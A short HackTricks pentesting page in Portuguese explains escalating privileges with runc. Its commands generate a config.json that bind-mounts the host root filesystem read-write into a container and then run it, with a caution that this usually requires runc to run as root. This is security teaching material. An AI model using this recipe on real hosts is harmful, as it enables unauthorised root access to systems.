# Escalação de Privilégios do RunC

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Se você quiser saber mais sobre **runc**, consulte a seguinte página:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se você descobrir que `runc` está instalado no host, pode ser possível **executar um contêiner montando a pasta raiz / do host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Isso nem sempre funcionará, pois a operação padrão do runc é ser executado como root, então executá-lo como um usuário sem privilégios simplesmente não pode funcionar (a menos que você tenha uma configuração sem root). Tornar uma configuração sem root a padrão geralmente não é uma boa ideia, pois há várias restrições dentro de contêineres sem root que não se aplicam fora de contêineres sem root.

{{#include ../../banners/hacktricks-training.md}}
